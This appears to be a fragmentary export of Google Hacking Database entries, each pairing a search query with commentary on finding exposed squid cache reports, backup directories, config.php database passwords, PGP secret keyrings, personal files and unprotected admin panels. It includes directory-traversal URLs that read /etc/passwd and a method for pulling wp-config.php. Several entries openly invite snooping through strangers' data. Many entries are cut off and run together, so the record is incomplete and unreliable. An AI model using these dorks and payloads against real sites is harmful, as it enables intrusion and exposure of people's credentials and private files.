&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;

This is generally accepted to be a Bad Idea(TM) as mentioned in the previous example. However, the googleDork index on this particular category gets quite a boost from the fact that this particular screen should NEVER be seen by the general public. To quote the default index screen: "Any users attempting to connect to this site are currently receiving an &#039;Under Construction page&#039;" THIS is not the &#039;Under Construction page.&#039; I was only able to generate this screen while sitting at the console of the server. The fact that this screen is revealed to the general public may indicate a misconfiguration of a much more insidious nature...&quot;
&quot;14&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Welcome to IIS 4.0"&quot;;&quot;Moving from personal, lightweight web servers into more production-ready software, we find that even administrators of Microsoft&#039;s Internet Information Server (IIS) sometimes don&#039;t have a clue what they&#039;re doing. By searching on web pages with titles of "Welcome to IIS 4.0" we find that even if they&#039;ve taken the time to change their main page, some dorks forget to change the titles of their default-installed web pages. This is an indicator that their web server is most likely running, or was upgraded from, the now considered OLD IIS 4.0 and that at least portions of their main pages are still exactly the same as they were out of the box. Conclusion? The rest of the factory-installed stuff is most likely lingering around on these servers as well. Old code: FREE with operating system.Poor content management: an average of $40/hour. Factory-installed default scripts: FREE with operating system.Getting hacked by a script kiddie that found you on Google: PRICELESS.For all the things money can&#039;t buy, there&#039;s a googleDork award.&quot;
&quot;15&quot;;&quot;2003-06-24&quot;;&quot;"Index of /backup"&quot;;&quot;Backup directories are often very interesting places to explore. More than one server has been compromised by a hacker&#039;s discovery of sensitive information contained in backup files or directories. Some of the sites in this search meant to reveal the contents of their backup directories, others did not. Think about it. What.s in YOUR backup directories? Would you care to share the contents with the whole of the online world? Probably not. Whether intentional or not, bsp.gsa.gov reveals backup directory through Google. Is this simply yet another misconfigured .gov site? You decide. BSP stands for "best security practices," winning this site the Top GoogleDork award for this category.&quot;
&quot;16&quot;;&quot;2003-06-24&quot;;&quot;"powered by openbsd" +"powered by apache"&quot;;&quot;I like the OpenBSD operating system. I really do. And I like the Apache web server software. Honestly. I admire the mettle of administrators who take the time to run quality, secure software. The problem is that you never know when security problems will pop up. A BIG security problem popped up within the OpenBSD/Apache combo back in the day.Now, every administrator that advertised this particular combo with cute little banners has a problem. Hackers can find them with Google. I go easy on these folks since the odds are they.ve patched their sites already. Then again, they may just show up on zone-h..&quot;

Everyone from drug lords to the head of the DEA can download PGP to encrypt their sensitive documents. Everyone, that is except googleDorks. GoogleDorks, it seems, don&#039;t understand that anyone in possession of your private keyring (secring) can get to your secret stuff. It should noever be given out, and should certainly not be posted on the Internet. The highest ranking is awarded for this surprising level of ineptitude.&quot;

These lists contain screen names of your "online buddies" in Instant Messenger. Not that&#039;s not too terribly exciting or stupid unless you want to mess with someone&#039;s mind, and besides, some people make these public on purpose. The thing that&#039;s interesting are the files that get stored ALONG WITH buddylists. Often this stuff includes downloaded pictures, resumes, all sorts of things. This is really for the peepers out there, and it&#039; possible to spend countless hours rifling through people&#039;s personal crap. Also try buddylist.blt, buddy.blt, buddies.blt.&quot;
&quot;27&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of config.php&quot;;&quot;This search brings up sites with "config.php" files. To skip the technical discussion, this configuration file contains both a username and a password for an SQL database. Most sites with forums run a PHP message base.

Without over-complicating things, this means that the robots.txt file gives a mini-roadmap of what&#039;s somewhat public and what&#039;s considered more private on a web site. Have a look at the robots.txt file itself, it contains interesting stuff.However, don&#039;t forget to check out the other files in these directories since they are usually at the top directory level of the web server!&quot;

Now just because google can find them, this doesn&#039;t necessarily mean that these are Windows NT directories that made their way onto the web. However, sometimes this happens. Other times, they aren&#039;t Windows NT directories, but backup directories for Windows NT data. Wither way, worthy of a nomination.&quot;

&quot;44&quot;;&quot;2003-06-30&quot;;&quot;filetype:ctl Basic&quot;;&quot;haccess.ctl is the frontpage(?) equivalent of the .htaccess file. Either way, this file decribes who can access a web page, and should not be shown to web surfers.

It is typicaly used by the underground sites on the Net who "pay for surfing ads" and advertise spam services or software.An attacker can find these sites by searching for the typical "powered by hit jammer !" frase on the bottom of the main page. Then if he changes the URL to www.target.com/admin/admin.php he is taken to the admin panel. Hit Jammer administrators are warned to protect this page with the .htaccess logon procedure, but many fail to do just that. In such cases, customer information like email addresses and passwords are in clear view of the attacker. Since human beings often use one simple password for many things this is a very dangerous practice.&quot;

Systems Affected: EasyWeb FileManager 1.0 RC-1Technical Description: The PostNuke module works by loading a directory and/or file via the "pathext" (directory) and "view" (file) variables. Providing a relative path (from the document repository) in the "pathext" variable will cause FileManager to provide a directory listing of that diretory. Selecting a file in that listing, or putting a file name in the "view" variable, will cause EasyWeb to load the file specified. Only files and directories which can be read by the system user running PHP can be retrieved.Assuming PostNuke is installed at the root level:/etc directory listing:/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/etc/passwd file:/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwdFix/Workaround:Use another file manager module for PostNuke, as the authors do not appear to bemaintaining EW FileManager.Vendor Status: Vendor was contacted but did not respond.Credir: Sullo - cirt.netNOTE: mitigating factor, an attacker needs to be registred and logged on to have access rights to this module.&quot;

This issue is a design error that occurs due to the &#039;set_time_limit&#039; function.The issue presents itself because the &#039;set_time_limit&#039; function forces the application to wait for 30-seconds before the verification and discarding of non-image files takes place. This allows for a window of opportunity for an attacker to execute a malicious script on a server.Gallery 1.4.4 is reported prone to this issue, however, other versions may be affected as well.

&quot;466&quot;;&quot;2004-09-09&quot;;&quot;inurl:"nph-proxy.cgi" "Start browsing through this CGI-based proxy"&quot;;&quot;Observing the web cracker in the wild, one feels like they are watching a bear. Like a bear stocks up on food and then hibernates, a web cracker must stock up on proxies, and then hack until they run out.Web crackers are a distinct breed, and many do not comfort well with the draconian measures that many other crackers take, such as port and service scanning, the modern web cracker finds such tactics much too intrusive. This leaves the web cracker with the only viable option to come in contact with a large number of proxies being to use public proxy lists. These are of course very slow, and very very unstable, and do not allow the cracker much time between his proxy runs.Luckily google gives them another option, if they are smart enough to find it.CGI-proxy ( http://www.jmarshall.com/tools/cgiproxy/ ) is a CGI-based proxy application. It runs on a web server, and acts as an http proxy, in CGI form. A prudent site owner would hide it behind .htaccess, as most do, but with a powerful tool like google, the inprudent few who leave it open can quickly be seperated from the wise masses.CGI-proxy&#039;s default page contains the text, as you can see in the demo on their site:"Start browsing through this CGI-based proxy by entering a URL below. Only HTTP and FTP URLs are supported. Not all functions will work (e.g. some JavaScript), but most pages will be fine."The proxy as it resides on a server is most often called nph-proxy.cgi. A web cracker can now use google to enumerate his list of proxy servers, like so:inurl:"nph-proxy.cgi" "Start browsing through this CGI-based proxy"More results can be obtained by admitting the "inurl:nph-proxy.cgi" constraint, but much more trash is generated as well.&quot;

It is also possible to perform SQL injection attacks on the SQL serverthat is used as the data store for the SalesLogix CRM system, reveal detailed error reports contained in HTTP headers and disclose the real filesystem paths to various SalesLogix directories. The SalesLogix server itself is vulnerable to an attack that wouldallow a malicious user to obtain the username and password used to access the SQL server used as a data store. The disclosed username and password always have read/write permissions on the database. Another vulnerability in the SalesLogix server allows anunauthenticated user to upload arbitrary files to the server in any directory (s)he chooses.http://www.securityfocus.com/bid/11450&quot;
&quot;623&quot;;&quot;2004-10-26&quot;;&quot;"Powered by DMXReady Site Chassis Manager" -site:dmxready.com&quot;;&quot;It is reported that DMXReady Site Chassis Manager is susceptible to two remotely exploitable input validation vulnerabilities. These vulnerabilities are due to a failure of the application to properly sanitize user-supplied data.The first issue is an unspecified cross-site scripting vulnerability. This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.The second issue is an unspecified SQL injection vulnerability. It may be possible for a remote user to inject arbitrary SQL queries into the underlying database used by the application. This could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.Successful exploitation could result in compromise of the application, disclosure or modification of data or may permit an attacker to exploit vulnerabilities in the underlying database implementation.&quot;

Many of the results of the search also show error logs which give an attacker the server side paths including the home directory name. This name is often also used for the login to ftp and shell access, which exposes the system to attack. There is also an undisclosed flaw in version 1.3 of the software, as the author has mentioned in version 1.4 as a security fix, but does not tell us what it is that was patched.<br />

<br />
Google Dork "allinurl:forcedownload.php?file="<br />
<br />
Sites that use the forcedownload.php script are vulnerable to url <br />
manipulation, and will spit out any file on the local site, including the <br />
PHP files themselves with all server side code, not the rendered page, but <br />
the source itself. This is most commonly used on wordpress sites to grab the <br />
wp-config.php file to gain access to the database, but is not limited to <br />
wordpress sites. I only list it as an example, so people understand the <br />
weight of flaw.<br />
